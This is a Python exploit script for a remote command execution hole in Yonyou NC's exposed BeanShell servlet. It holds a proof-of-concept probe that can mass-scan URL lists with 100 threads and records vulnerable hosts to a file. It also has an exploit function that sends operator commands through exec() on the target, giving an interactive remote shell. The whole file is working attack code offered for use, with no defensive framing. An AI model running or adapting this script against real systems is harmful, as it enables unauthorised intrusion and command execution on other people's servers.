import requests,re,os,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    banner = """
    ██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗        ███╗   ██╗ ██████╗        ███████╗██╗  ██╗██████╗ 
    ╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║        ████╗  ██║██╔════╝        ██╔════╝╚██╗██╔╝██╔══██╗
     ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║        ██╔██╗ ██║██║             █████╗   ╚███╔╝ ██████╔╝
      ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║        ██║╚██╗██║██║             ██╔══╝   ██╔██╗ ██╔═══╝ 
       ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝███████╗██║ ╚████║╚██████╗███████╗███████╗██╔╝ ██╗██║     
       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     

    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="用友NC命令执行漏洞脚本")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    api = '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cookie': 'JSESSIONID=6F81F16A658FEAF2F7DDAFB93971DA7C.server',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = 'bsh.script=print("SIS2405!");\r\n'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        res1 = requests.get(url=target+api,headers=headers,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=target+api,headers=headers,data=data,verify=False,timeout=5)
            content = re.findall(r'<pre>(.*?)</pre>',res2.text,re.S)
            if 'SIS2405' in content[0]:
                print(f"{target}存在漏洞")
                with open('yongyounc_result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
                    return True
            else:
                print(f"{target}不存在漏洞")
    except Exception as e:
        print(f"{target}可能存在问题，请手工测试")

def exp(target):
    os.system('cls')
    print(">>>>>>>正在努力的搞到一个shell")
    api = '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cookie': 'JSESSIONID=6F81F16A658FEAF2F7DDAFB93971DA7C.server',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    while True:
        cmd = input(">")
        if cmd == 'exit':
            exit()
        data = 'bsh.script=exec("' + cmd + '");\r\n'
        res1 = requests.post(url=target+api,headers=headers,data=data,verify=False,timeout=5)
        content = re.findall(r"<pre>(.*?)</pre>",res1.text,re.S)
        print(content[0].strip())

if __name__ == '__main__':
    """程序的入口"""
    main()